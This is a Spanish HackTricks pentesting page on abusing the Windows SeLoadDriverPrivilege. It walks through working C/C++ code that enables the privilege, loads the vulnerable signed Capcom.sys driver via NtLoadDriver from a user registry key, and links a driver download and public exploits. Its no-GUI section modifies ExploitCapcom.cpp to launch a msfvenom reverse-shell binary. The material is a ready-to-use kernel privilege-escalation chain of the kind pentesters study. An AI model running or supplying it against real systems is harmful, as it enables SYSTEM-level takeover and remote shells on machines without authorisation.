# Abuso de SeLoadDriverPrivilege

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Consigue el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PR al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## SeLoadDriverPrivilege <a href="#seloaddriverprivilege" id="seloaddriverprivilege"></a>

Un privilegio muy peligroso para asignar a cualquier usuario, ya que permite al usuario cargar controladores de kernel y ejecutar código con privilegios de kernel, también conocido como `NT\System`. Vea cómo el usuario `offense\spotless` tiene este privilegio:

![](../../../.gitbook/assets/a8.png)

`Whoami /priv` muestra que el privilegio está desactivado de forma predeterminada:

![](../../../.gitbook/assets/a9.png)

Sin embargo, el siguiente código permite habilitar ese privilegio de manera bastante sencilla:

{% code title="privileges.cpp" %}
```c
#include "stdafx.h"
#include <windows.h>
#include <stdio.h>

int main()
{
	TOKEN_PRIVILEGES tp;
	LUID luid;
	bool bEnablePrivilege(true);
	HANDLE hToken(NULL);
	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);

	if (!LookupPrivilegeValue(
		NULL,            // lookup privilege on local system
		L"SeLoadDriverPrivilege",   // privilege to lookup 
		&luid))        // receives LUID of privilege
	{
		printf("LookupPrivilegeValue error: %un", GetLastError());
		return FALSE;
	}
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	
	if (bEnablePrivilege) {
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	}
	
	// Enable the privilege or disable all privileges.
	if (!AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))
	{
		printf("AdjustTokenPrivileges error: %x", GetLastError());
		return FALSE;
	}

	system("cmd");
    return 0;
}
```
{% endcode %}

Compilamos lo anterior, lo ejecutamos y el privilegio `SeLoadDriverPrivilege` ahora está habilitado:

![](../../../.gitbook/assets/a10.png)

### Exploit del controlador Capcom.sys <a href="#capcom-sys-driver-exploit" id="capcom-sys-driver-exploit"></a>

Para demostrar aún más que `SeLoadDriverPrivilege` es peligroso, vamos a **explotarlo para elevar privilegios**.

Puede cargar un nuevo controlador usando **NTLoadDriver:**
```cpp
NTSTATUS NTLoadDriver(
  _In_ PUNICODE_STRING DriverServiceName
);
```
Por defecto, el nombre del servicio del controlador debería estar en `\Registry\Machine\System\CurrentControlSet\Services\`. 

Pero, según la **documentación**, también se **puede usar** rutas bajo **HKEY\_CURRENT\_USER**, por lo que se podría **modificar** un **registro** allí para **cargar controladores arbitrarios** en el sistema. 
Los parámetros relevantes que deben definirse en el nuevo registro son:

* **ImagePath:** valor de tipo REG\_EXPAND\_SZ que especifica la ruta del controlador. En este contexto, la ruta debería ser un directorio con permisos de modificación por parte del usuario sin privilegios.
* **Type:** valor de tipo REG\_WORD en el que se indica el tipo de servicio. Para nuestro propósito, el valor debe definirse como SERVICE\_KERNEL\_DRIVER (0x00000001).

Por lo tanto, se podría crear un nuevo registro en **`\Registry\User\<User-SID>\System\CurrentControlSet\MyService`** indicando en **ImagePath** la ruta al controlador y en **Type** el valor 1, y usar esos valores en el exploit (se puede obtener el SID del usuario usando: `Get-ADUser -Identity 'USERNAME' | select SID` o `(New-Object System.Security.Principal.NTAccount("USERNAME")).Translate([System.Security.Principal.SecurityIdentifier]).value`.
```bash
PCWSTR pPathSource = L"C:\\experiments\\privileges\\Capcom.sys";
PCWSTR pPathSourceReg = L"\\Registry\\User\\<User-SID>\\System\\CurrentControlSet\\MyService";
```
El primer comando declara una variable de cadena indicando dónde se encuentra el controlador vulnerable **Capcom.sys** en el sistema víctima y el segundo es una variable de cadena que indica un nombre de servicio que se utilizará (podría ser cualquier servicio).\
Tenga en cuenta que el **controlador debe estar firmado por Windows** por lo que no se pueden cargar controladores arbitrarios. Pero, **Capcom.sys** **puede ser abusado para ejecutar código arbitrario y está firmado por Windows**, por lo que el objetivo es cargar este controlador y explotarlo.

Cargar el controlador:
```c
#include "stdafx.h"
#include <windows.h>
#include <stdio.h>
#include <ntsecapi.h>
#include <stdlib.h>
#include <locale.h>
#include <iostream>
#include "stdafx.h"

NTSTATUS(NTAPI *NtLoadDriver)(IN PUNICODE_STRING DriverServiceName);
VOID(NTAPI *RtlInitUnicodeString)(PUNICODE_STRING DestinationString, PCWSTR SourceString);
NTSTATUS(NTAPI *NtUnloadDriver)(IN PUNICODE_STRING DriverServiceName);

int main()
{
	TOKEN_PRIVILEGES tp;
	LUID luid;
	bool bEnablePrivilege(true);
	HANDLE hToken(NULL);
	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);

	if (!LookupPrivilegeValue(
		NULL,            // lookup privilege on local system
		L"SeLoadDriverPrivilege",   // privilege to lookup 
		&luid))        // receives LUID of privilege
	{
		printf("LookupPrivilegeValue error: %un", GetLastError());
		return FALSE;
	}
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	
	if (bEnablePrivilege) {
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	}
	
	// Enable the privilege or disable all privileges.
	if (!AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))
	{
		printf("AdjustTokenPrivileges error: %x", GetLastError());
		return FALSE;
	}

	//system("cmd");
	// below code for loading drivers is taken from https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/RDI/dll/NtLoadDriver.h
	std::cout << "[+] Set Registry Keys" << std::endl;
	NTSTATUS st1;
	UNICODE_STRING pPath;
	UNICODE_STRING pPathReg;
	PCWSTR pPathSource = L"C:\\experiments\\privileges\\Capcom.sys";
  PCWSTR pPathSourceReg = L"\\Registry\\User\\<User-SID>\\System\\CurrentControlSet\\MyService";
	const char NTDLL[] = { 0x6e, 0x74, 0x64, 0x6c, 0x6c, 0x2e, 0x64, 0x6c, 0x6c, 0x00 };
	HMODULE hObsolete = GetModuleHandleA(NTDLL);
	*(FARPROC *)&RtlInitUnicodeString = GetProcAddress(hObsolete, "RtlInitUnicodeString");
	*(FARPROC *)&NtLoadDriver = GetProcAddress(hObsolete, "NtLoadDriver");
	*(FARPROC *)&NtUnloadDriver = GetProcAddress(hObsolete, "NtUnloadDriver");

	RtlInitUnicodeString(&pPath, pPathSource);
	RtlInitUnicodeString(&pPathReg, pPathSourceReg);
	st1 = NtLoadDriver(&pPathReg);
	std::cout << "[+] value of st1: " << st1 << "\n";
	if (st1 == ERROR_SUCCESS) {
		std::cout << "[+] Driver Loaded as Kernel..\n";
		std::cout << "[+] Press [ENTER] to unload driver\n";
	}

	getchar();
	st1 = NtUnloadDriver(&pPathReg);
	if (st1 == ERROR_SUCCESS) {
		std::cout << "[+] Driver unloaded from Kernel..\n";
		std::cout << "[+] Press [ENTER] to exit\n";
		getchar();
	}

    return 0;
}
```
Una vez que el código anterior se compila y se ejecuta, podemos ver que nuestro controlador malicioso `Capcom.sys` se carga en el sistema víctima:

![](../../../.gitbook/assets/a11.png)

Descarga: [Capcom.sys - 10KB](https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LTyWsUdKa48PyMRyZ4I%2F-LTyZ9IkoofuWRxlNpUG%2FCapcom.sys?alt=media\&token=e4417fb3-f2fd-42ef-9000-d410bc6ceb54)

**Ahora es el momento de abusar del controlador cargado para ejecutar código arbitrario.**

Puede descargar exploits de [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom) y [https://github.com/zerosum0x0/puppetstrings](https://github.com/zerosum0x0/puppetstrings) y ejecutarlos en el sistema para elevar nuestros privilegios a `NT Authority\System`:

![](../../../.gitbook/assets/a12.png)

### Sin GUI

Si **no tenemos acceso a la GUI** del objetivo, tendremos que modificar el código **`ExploitCapcom.cpp`** antes de compilarlo. Aquí podemos editar la línea 292 y reemplazar `C:\\Windows\\system32\\cmd.exe"` con, por ejemplo, un binario de shell inversa creado con `msfvenom`, por ejemplo: `c:\ProgramData\revshell.exe`.

Código:
```c
// Launches a command shell process
static bool LaunchShell()
{
    TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
    PROCESS_INFORMATION ProcessInfo;
    STARTUPINFO StartupInfo = { sizeof(StartupInfo) };
    if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE,
        CREATE_NEW_CONSOLE, nullptr, nullptr, &StartupInfo,
        &ProcessInfo))
    {
        return false;
    }

    CloseHandle(ProcessInfo.hThread);
    CloseHandle(ProcessInfo.hProcess);
    return true;
}
```
La cadena `CommandLine` en este ejemplo sería cambiada a:

Código: c
```c
 TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");
```
Configuraremos un listener basado en la carga útil `msfvenom` que generamos y esperamos recibir una conexión de shell inversa cuando ejecutemos `ExploitCapcom.exe`. Si por alguna razón se bloquea la conexión de shell inversa, podemos intentar una carga útil de shell de enlace o ejecución/agregación de usuario.

### Automático

Puede utilizar [https://github.com/TarlogicSecurity/EoPLoadDriver/](https://github.com/TarlogicSecurity/EoPLoadDriver/) para **habilitar automáticamente** el **privilegio**, **crear** la **clave del registro** bajo HKEY\_CURRENT\_USER y **ejecutar NTLoadDriver** indicando la clave del registro que desea crear y la ruta del controlador:

![](<../../../.gitbook/assets/image (289).png>)

Luego, deberá descargar un exploit **Capcom.sys** y usarlo para escalar privilegios.
